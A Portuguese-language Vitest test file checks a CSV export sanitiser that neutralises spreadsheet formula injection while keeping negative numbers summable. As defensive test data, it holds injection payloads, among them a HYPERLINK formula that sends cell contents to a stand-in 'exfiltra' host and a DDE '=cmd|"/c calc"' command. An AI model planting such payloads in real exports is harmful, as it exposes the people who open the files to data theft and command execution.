import { describe, expect, it } from "vitest";
import { neutralizarFormula, paraCsv } from "../lib/csv/csv";

/**
 * ═══ O CSV PÚBLICO É ABERTO NUMA PLANILHA — E PLANILHA EXECUTA CÉLULA ═══
 *
 * ⚠️ O RISCO É REAL E VEM DE DADO DE CADASTRO. A descrição de um bem, o objeto de um contrato e
 * o nome de um credor são digitados por um operador e saem inteiros na exportação pública. Excel
 * e LibreOffice tratam como FÓRMULA toda célula iniciada por `=`, `+`, `@`, `-`, tabulação ou
 * retorno de carro — então `=HYPERLINK(...)` numa descrição vira um link executável na máquina de
 * quem baixou o arquivo do portal.
 *
 * ⚠️ E O TESTE TEM DUAS METADES, porque só a primeira seria uma correção que quebra o produto:
 * o valor negativo `-1.234,56` PRECISA continuar número, ou a coluna de valores deixa de somar
 * na planilha e a exportação fica inútil de outro jeito.
 */
describe("neutralização de fórmula na exportação CSV", () => {
  it("neutraliza os inícios que a planilha executa", () => {
    for (const perigoso of [
      '=HYPERLINK("http://exfiltra/?d="&A1,"clique")',
      "=1+1",
      "+1234",
      "@SUM(A1:A9)",
      "\tvalor com tabulação",
      "\rvalor com retorno",
      "-ativar()",
    ]) {
      expect(
        neutralizarFormula(perigoso),
        `"${perigoso}" saiu do CSV como a planilha o recebe: executável`
      ).toBe(`'${perigoso}`);
    }
  });

  it("NÃO estraga número negativo — ele tem de continuar somável", () => {
    for (const numero of ["-1.234,56", "-0,01", "-12", "1.234,56", "0,00"]) {
      expect(
        neutralizarFormula(numero),
        `"${numero}" virou texto na planilha; uma coluna de valores que não soma é ` +
          `um defeito tão real quanto a fórmula que a correção evita`
      ).toBe(numero);
    }
  });

  it("o texto comum atravessa intacto", () => {
    for (const t of ["Computador de mesa", "001234", "15/03/2026", "D'Ávila", "Sala 2; anexo"]) {
      expect(neutralizarFormula(t)).toBe(t);
    }
  });

  it("no arquivo montado, a célula perigosa sai entre aspas e com o apóstrofo", () => {
    const csv = paraCsv(["Tombamento", "Descrição"], [["001", '=cmd|"/c calc"!A1']]);
    expect(csv).toContain(`"'=cmd|""/c calc""!A1"`);
    // E o cabeçalho e o resto continuam como antes.
    expect(csv).toContain("Tombamento;Descrição");
  });
});
